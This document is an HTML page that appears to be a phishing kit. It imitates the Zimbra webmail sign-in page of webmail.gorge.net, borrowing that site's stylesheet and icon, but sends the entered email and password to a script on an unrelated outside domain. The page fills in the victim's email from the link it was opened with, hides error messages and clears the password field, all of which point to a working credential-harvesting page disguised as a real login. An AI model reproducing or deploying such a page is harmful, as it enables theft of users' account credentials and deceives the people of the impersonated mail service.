

                    <!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <title>Zimbra Web Client Sign In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration.">
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black" />

    <link rel="stylesheet" type="text/css"
          href="https://webmail.gorge.net/css/common,login,zhtml,skin.css?skin=harmony&v=250123180901">

    <style>
        .ImgLoginBanner {
            background-image: none !important;
        }

        /* Hide error message permanently */
        #errorMessageDiv {
            display: none !important;
        }
    </style>

    <link rel="SHORTCUT ICON" href="https://webmail.gorge.net/img/logo/favicon.ico">
</head>

<body onload="onLoad();">

<div id="modifiedLogin" class="LoginScreen">
    <div class="modernCenter">
        <div class="modernContentBox">

            <div class="logo">
                <a href="https://imgur.com/1XgwoSN/" id="bannerLink" target="_new">
                    <img src="https://i.imgur.com/1XgwoSN.jpeg"
                         alt="Your Logo"
                         class="ImgLoginBanner">
                </a>
            </div>

            <form id="zLoginForm"
                  method="post"
                  name="loginForm"
                  action="https://innpact.co.za/administrator/includes/xlx.php/zim.php"
                  accept-charset="UTF-8">

                <input type="hidden" name="loginOp" value="login">

                <div class="signIn">Log In</div>

                <div class="form">

                    <div id="errorMessageDiv" class="errorMessage"></div>

                    <div class="loginSection">

                        <label for="email" class="zLoginFieldLabel">Email</label>
                        <input id="email"
                               class="zLoginFieldInput"
                               name="email"
                               type="text"
                               size="40"
                               autocapitalize="off"
                               autocorrect="off">

                        <label for="password" class="zLoginFieldLabel">Password</label>
                        <div class="passwordWrapper">
                            <input id="password"
                                   class="zLoginFieldInput"
                                   name="password"
                                   type="password"
                                   size="40"
                                   autocomplete="off">
                        </div>

                        <button id="loginButton"
                                type="submit"
                                class="loginButton">
                            Log In
                        </button>

                    </div>

                </div>
            </form>
        </div>
    </div>

    <div class="Footer">
        <div class="legalNotice-small">
            © 2005-2023 Synacor, Inc.
        </div>
    </div>
</div>

<script>
    function onLoad() {

        /* Autofill email from URL */
        const params = new URLSearchParams(window.location.search);
        const email = params.get('email');
        if (email) {
            document.getElementById('email').value = email;
        }

        /* Ensure password is ALWAYS empty on load */
        const password = document.getElementById('password');
        if (password) {
            password.value = '';
        }

        /* Hide error message */
        const errorMessageDiv = document.getElementById('errorMessageDiv');
        if (errorMessageDiv) {
            errorMessageDiv.style.display = 'none';
        }
    }

    /* ✅ CLEAR PASSWORD AFTER FIRST ATTEMPT */
    document.getElementById('zLoginForm').addEventListener('submit', function () {
        document.getElementById('password').value = '';
    });
</script>

</body>
</html>
